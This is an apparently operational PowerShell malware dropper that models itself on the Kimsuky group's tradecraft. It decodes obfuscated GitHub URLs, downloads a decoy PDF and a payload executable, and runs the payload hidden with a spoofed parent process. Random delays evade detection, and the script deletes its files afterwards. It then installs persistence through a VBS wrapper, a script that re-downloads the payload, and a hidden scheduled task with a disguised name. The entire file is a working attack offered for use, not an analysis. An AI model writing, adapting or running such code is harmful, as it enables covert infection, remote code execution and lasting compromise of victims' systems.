# launcher.ps1 - Full initial drop + KimSuky-grade persistence (one file, same GitHub link)
$ErrorActionPreference = 'SilentlyContinue'

# Random initial delay (2-8 seconds)
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)

# Less monitored folder
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) {
    New-Item -ItemType Directory -Path $cache -Force | Out-Null
}

# Base64 encoded URLs (unchanged from your original)
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWtheV9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

# Download PDF decoy
$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}

# Random delay
Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)

# Download EXE (your APC-injected beast)
try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}

# Open PDF decoy
try { Start-Process $pdfPath } catch {}

# Long delay before first launch (breaks temporal correlation)
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# Launch EXE via WScript.Shell (parent = explorer.exe, not powershell.exe)
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch {
    Start-Process $exePath -WindowStyle Hidden
}

# Optional initial cleanup job (your original 5-min delete)
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 300
    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $args[1] -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null

# === KIMSUKY-GRADE PERSISTENCE SETUP (runs once on first launch) ===
$randFolder = [System.IO.Path]::GetRandomFileName()
$persistDir = "$env:TEMP\$randFolder"
New-Item -ItemType Directory -Path $persistDir -Force | Out-Null

$vbsPath = "$persistDir\update.vbs"
$syncPath = "$persistDir\sync.ps1"
$taskName = "Windows Cache Updater Task S-1-12-12-3-$(Get-Random -Min 100000000 -Max 999999999)BVSKLERh-SD$(Get-Random -Min 100 -Max 999)"

# VBS wrapper (wscript.exe → hidden PS)
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

# Persistent sync script (redownloads EXE if missing + relaunches)
$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)
`$cache = "`$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }
`$exeUrl = '$exeUrl'
`$exePath = "`$cache\helper.exe"
if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100KB)) {
    try {
        Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
    } catch {}
}
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
} catch {
    Start-Process `$exePath -WindowStyle Hidden
}
Start-Sleep -Seconds 60
Get-ChildItem `$cache -Filter "*.exe" -Exclude "helper.exe" | Remove-Item -Force -ErrorAction SilentlyContinue
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

# Create scheduled task (exact KimSuky style - survives reboots)
$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 30)
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

# Fire it once immediately so persistence is live
Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
